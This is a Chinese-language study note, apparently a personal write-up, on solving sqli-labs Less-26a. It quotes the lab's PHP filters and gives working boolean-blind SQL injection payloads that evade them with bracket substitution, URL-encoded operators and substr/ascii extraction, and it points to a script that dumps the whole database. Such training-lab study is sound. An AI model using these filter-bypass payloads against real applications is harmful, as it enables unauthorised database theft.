# Less-26a （空格注释全禁+括号闭合+盲注）

## 查看分析源码

过滤和 Less-26 一模一样：

```php
$id= preg_replace('/or/i',"", $id);        // 去掉 or
$id= preg_replace('/and/i',"", $id);       // 去掉 and
$id= preg_replace('/[\/\*]/',"", $id);     // 去掉 /*
$id= preg_replace('/[--]/',"", $id);       // 去掉 --
$id= preg_replace('/[#]/',"", $id);        // 去掉 #
$id= preg_replace('/[\s]/',"", $id);       // 去掉空格 Tab 换行（两次）
$id= preg_replace('/[\s]/',"", $id);
$id= preg_replace('/[\/\\\\]/',"", $id);    // 去掉 / 和 \
```

两个差异：
1. 括号闭合 `id=('$id')` → 用 `')` 闭合
2. `print_r(mysql_error())` 被注释了 → 没报错

没报错 → updatexml 不起作用 → 只能用布尔盲注。空格 `\s` 全禁 → 用 `()` 包裹替代。and → `%26%26`，or → 双写。

## 验证注入点

```
?id=1')%26%26(1)%26%26('1     ← 返回数据
?id=1')%26%26(0)%26%26('1     ← 不返回
```

浏览器里 `=` 用 `%3d` 编码。Burp/curl 里同样要注意：payload 中第二个及以后的 `=`（比较符）也要 `%3d`。

## 手工 payload 写法（一个示例就够了）

模式都一样，`&&(条件)&&('1`，条件用 `substr` 逐位比。以库名首字符为例：

```
?id=1')%26%26((select(substr(database(),1,1)))%3d's')%26%26('1
```

模式：
- 查长度：`((select(length((子查询))))=N)`
- 查字符：`((select(substr((子查询),位置,1)))='字符')`
- 二分加速：`(ascii(substr((子查询),位置,1))>65)`

换表名/列名/数据只换子查询里的内容即可，写法完全一样。

注意 `ascii` 不能用 `ord`——`ord` 里有 `or` 会被过滤成 `d`。
注意 `LIMIT(0,1)` 带括号不行 → 用 `group_concat` + `substr` 定位。

## 自动脚本

手工逐字符爆太慢，直接跑脚本：

```bash
cd D:\obsidian\security-notes\03_Topics\靶场项目\sqli-labs
python sqli-26a-blind.py
```

全链路自动爆完（库名→表名→列名→数据），约 2 分钟。
![](99_Attachments/图片/Less-26a/file-20260615201027216.png)
![](99_Attachments/图片/Less-26a/file-20260615201038358.png)
